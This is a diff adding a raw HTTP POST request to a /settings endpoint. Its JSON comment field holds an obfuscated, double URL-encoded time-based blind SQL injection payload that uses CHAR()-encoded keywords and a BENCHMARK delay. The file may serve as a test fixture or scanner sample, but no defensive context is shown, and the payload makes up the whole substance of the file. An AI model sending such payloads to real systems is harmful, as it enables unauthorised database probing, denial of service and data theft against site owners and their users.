@@ -1,0 +1,9 @@
+POST /settings HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 103
+
+{"comment": "'%2520CHAR(111,114)%2520BenchMark(1000000,Md5(1))--%3B%2520CHAR(83,69,76,69,67,84)%25201"}
